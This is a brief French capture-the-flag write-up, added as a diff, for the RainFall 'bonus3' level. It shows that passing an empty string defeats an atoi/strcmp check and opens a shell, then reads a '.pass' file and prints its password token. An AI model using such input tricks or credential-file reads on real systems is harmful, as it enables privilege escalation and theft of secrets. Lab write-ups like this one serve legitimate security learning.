@@ -1,0 +1,16 @@
+Nous avons un programme avec deux arguments. On doit jouer avec la valeur du atoi() afin de mettre un '\0' au bonne endroit.
+
+On doit trouver une chaine de caractere avec qui au retour de atoi vaut 0 et qu'un strcmp sur cette chaien vaut 0.
+
+Que faire ?? NE PAS UTILISER D'OUTILS !!!!!!
+
+
+NON !!!!!!!!!!!			
+		./bonus3 $(echo -n "")
+		./bonus3 $(python -c 'print "\x00\x00"')
+
+Mais jsute une "" empty string ......
+
+bonus3@RainFall:~$ ./bonus3 ""
+$ cat /home/user/end/.pass
+3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
